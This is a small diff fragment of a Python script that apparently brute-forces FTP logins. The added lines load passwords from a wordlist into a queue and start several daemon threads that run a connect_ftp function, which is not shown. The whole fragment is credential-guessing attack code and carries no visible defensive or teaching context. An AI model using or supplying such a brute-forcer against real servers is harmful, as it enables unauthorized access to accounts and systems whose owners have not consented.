@@ -99,3 +99,12 @@ def connect_ftp():
 # read the wordlist of passwords
 passwords = open("wordlist.txt").read().split("\n")
 print("[+] Passwords to try:", len(passwords))
+# put all passwords to the queue
+for password in passwords:
+    q.put(password)
+# create `n_threads` that runs that function
+for t in range(n_threads):
+    thread = Thread(target=connect_ftp)
+    # will end when the main thread end
+    thread.daemon = True
+    thread.start()
